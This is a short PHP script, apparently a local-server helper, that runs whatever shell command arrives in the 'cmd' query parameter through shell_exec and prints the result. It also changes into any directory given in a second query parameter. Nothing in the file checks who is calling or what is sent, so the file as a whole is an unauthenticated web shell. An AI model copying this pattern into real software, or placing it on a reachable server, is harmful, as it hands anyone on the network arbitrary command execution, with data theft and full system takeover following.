<?php
set_time_limit(36000);		// alows enough time to run the whole script up to 10hr
$rawdisplay=($_GET["rawdisplay"]==1);

$HOME_DIRECTORY="";
if (isset($_GET["HOME_DIRECTORY"])) {
  $HOME_DIRECTORY=$_GET["HOME_DIRECTORY"];
}


if($rawdisplay) {
header("Content-type: text/plain");
header('Cache-Control: no-cache, no-store, max-age=0, must-revalidate');
header('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); // Date in the past
header('Pragma: no-cache');

// tell php to automatically flush after every output
// including lines of output produced by shell commands
ob_implicit_flush(true);
ob_end_flush();
} else {
ob_start();
}

//echo $_SERVER['REQUEST_URI']."\n";
if($HOME_DIRECTORY=="") {
$dir=substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], "/"));
chdir ("c:/UniServer/www".$dir);
} else {
  chdir ($HOME_DIRECTORY);
}

$send_cmd=$_GET['cmd'];
$result = shell_exec($send_cmd) ;

echo $result ;
?>

